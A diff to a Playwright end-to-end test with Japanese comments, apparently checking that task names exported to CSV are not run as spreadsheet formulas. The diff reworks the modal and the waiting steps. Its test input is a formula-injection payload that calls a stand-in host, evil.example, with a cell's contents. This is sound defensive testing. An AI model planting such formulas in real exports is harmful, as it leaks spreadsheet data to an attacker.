@@ -136,14 +136,25 @@ test("CSV に書き出した名前は、表計算ソフトで式として走ら�
 }) => {
   await open(page);
   await page.click('.tabs button[data-tab="tasks"]');
-  const name = page
+  await page
     .locator(".task-table tbody tr")
     .nth(1)
-    .locator('input[type="text"]')
-    .first();
+    .locator(".row-open")
+    .click();
+  const name = page.locator(
+    '.modal-card.detail-card input[data-focus$=":name"]',
+  );
   const formula = '=HYPERLINK("https://evil.example/?"&A1,"見て")';
+  const run = await page.locator("#status").getAttribute("data-run");
   await name.fill(formula);
   await name.press("Tab");
+  // 窓を閉じないと、後ろのメニューに手が届かない。
+  await page.click('.modal-card.detail-card button[title="詳細を閉じる"]');
+  // 計算し直しで描き直されると、開いたメニューが閉じる。済むのを待つ。
+  await expect(page.locator("#status")).not.toHaveAttribute(
+    "data-run",
+    run ?? "",
+  );
 
   await page.click(".menu > summary");
   const [download] = await Promise.all([
